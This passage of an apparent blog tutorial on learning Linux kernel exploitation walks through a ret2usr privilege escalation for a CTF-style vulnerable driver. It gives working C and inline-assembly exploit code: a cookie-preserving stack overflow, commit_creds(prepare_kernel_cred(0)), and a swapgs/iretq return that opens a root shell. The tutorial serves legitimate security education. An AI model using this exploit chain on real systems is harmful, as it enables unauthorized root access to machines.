<p>The situation here is the same as leaking, we will create an <code>unsigned long</code> array, then overwrite the cookie with our leaked cookie at index 16. The important thing to note here is that different from <code>userland</code> programs, this kernel function actually pops 3 registers from the stack, namely <code>rbx</code>, <code>r12</code>, <code>rbp</code> instead of just <code>rbp</code> (this can clearly be seen in the disassembly of the functions). Therefore, we have to put 3 dummy values after the cookie. Then the next value will be the return address that we want our program to return into, which is the function that we will craft on the <code>userland</code> to achieve root privileges, I called it <code>escalate_privs</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
</span><span class="c1"></span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>The final concern here is what do we actually write in that function to achieve root privileges.</p>
<h3 id="getting-root-privileges">Getting root privileges</h3>
<p>Again, just as a reminder, our goal in kernel exploitation is not to pop a shell via <code>system(&quot;/bin/sh&quot;)</code> or <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>, but it is to achieve root privileges in the system, then pop a root shell. Typically, the most common way to do this is by using the 2 functions called <code>commit_creds()</code> and <code>prepare_kernel_cred()</code>, which are functions that already reside in the kernel-space code itself. What we need to do is to call the 2 functions like this:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</code></pre></div><p>Since <code>KASLR</code> is disabled, the addresses where these functions reside in is constant across every boot. Therefore, we can just easily get those addresses by reading <code>/proc/kallsyms</code> file using these shell commands:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
-&gt; ffffffff814c6410 T commit_creds
cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
-&gt; ffffffff814c67f0 T prepare_kernel_cred
</code></pre></div><p>Then the code to achieve root privileges can be written as follows (you can write it in many different ways, it&rsquo;s just simply calling 2 functions consecutively using one&rsquo;s return value as the other&rsquo;s parameter, I just saw this in a writeup and copied it):</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
        <span class="p">...</span>
        <span class="s">&#34;.att_syntax;&#34;</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><em>You can take note of the way I write the code, it is a very clean way of writing in-line assembly in C code using <code>intel syntax</code>.</em></div>
        </div>
    </div>
<h3 id="returning-to-userland">Returning to userland</h3>
<p>At the current state of the exploitation, if you simply return to a <code>userland</code> piece of code to pop a shell, you will be disappointed. The reason is because after running the above code, we are still executing in <code>kernel-mode</code>. In order to open a root shell, we have to return to <code>user-mode</code>.</p>
<p>Basically, if the kernel runs normally, it will return to userland using 1 of these instructions (in x86_64): <code>sysretq</code> or <code>iretq</code>. The typical way that most people use is through <code>iretq</code>, because as far as I know, <code>sysretq</code> is more complicated to get right. The <code>iretq</code> instruction just requires the stack to be setup with <strong>5 userland register values</strong> in this order: <code>RIP|CS|RFLAGS|SP|SS</code>.</p>
<p>The process keeps track of 2 different sets of values for these registers, one for <code>user-mode</code> and one for <code>kernel-mode</code>. Therefore, after finishing executing in <code>kernel-mode</code>, it must revert back to the <code>user-mode</code> values for these registers. For <code>RIP</code>, we can simply set this to be the address of the function that pops a shell. However, for the other registers, if we just set them to be something random, the process may not continue execution as expected. To solve this problem, people have thought of a very clever way: <em>save the state of these registers before going into kernel-mode, then reload them after gaining root privileges</em>. The function to save their states is as follow:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
        <span class="s">&#34;mov user_cs, cs;&#34;</span>
        <span class="s">&#34;mov user_ss, ss;&#34;</span>
        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
        <span class="s">&#34;pushf;&#34;</span>
        <span class="s">&#34;pop user_rflags;&#34;</span>
        <span class="s">&#34;.att_syntax;&#34;</span>
    <span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>And one more thing, on x86_64, one more instruction called <code>swapgs</code> must be called before <code>iretq</code>. The purpose of this instruction is to also swap the <code>GS</code> register between <code>kernel-mode</code> and <code>user-mode</code>. With all those information, we can finish the code to gain root privileges, then return to <code>user-mode</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
        <span class="s">&#34;swapgs;&#34;</span>
        <span class="s">&#34;mov r15, user_ss;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_sp;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_cs;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;mov r15, user_rip;&#34;</span>
        <span class="s">&#34;push r15;&#34;</span>
        <span class="s">&#34;iretq;&#34;</span>
        <span class="s">&#34;.att_syntax;&#34;</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>We can finally call those pieces that we have crafted one by one, in the correct order, to open a root shell:</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">save_state</span><span class="p">();</span>
    <span class="n">open_dev</span><span class="p">();</span>
    <span class="n">leak</span><span class="p">();</span>
    <span class="n">overflow</span><span class="p">();</span>  
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>So that concludes my first post on my Linux kernel exploitation learning process. In this post, I have demonstrated the way to setup the environment for a Linux kernel pwn challenge, and also the simplest technique in kernel exploitation: <code>ret2usr</code>.</p>
<p>In the next post, I will gradually increase the difficulty by adding more and more mitigations, and show you the corresponding technique to bypass them.</p>
<h2 id="appendix">Appendix</h2>
<p>The script to extract kernel image is <a href="/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh" rel="">extract-image.sh</a>.</p>
<p>The script to decompress the file system is <a href="/posts/20210123-linux-kernel-pwn-part-1/decompress.sh" rel="">decompress.sh</a>.</p>
<p>The script to compile exploit and compress file system is <a href="/posts/20210123-linux-kernel-pwn-part-1/compress.sh" rel="">compress.sh</a>.</p>
<p>The full <code>ret2usr</code> exploitation code is <a href="/posts/20210123-linux-kernel-pwn-part-1/ret2usr.c" rel="">ret2usr.c</a>.</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-01-23</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/20210103-tetctf2021-writeups/" class="prev" rel="prev" title="TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups"><i class="fas fa-angle-left fa-fw"></i>TetCTF2021 - cache_v1, cache_v2, SimpleSystem writeups</a>
            <a href="/posts/linux-kernel-pwn-part-2/" class="next" rel="next" title="Learning Linux Kernel Exploitation - Part 2">Learning Linux Kernel Exploitation - Part 2<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-HGQHGNF9HJ');
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HGQHGNF9HJ" async></script></body>
</html>
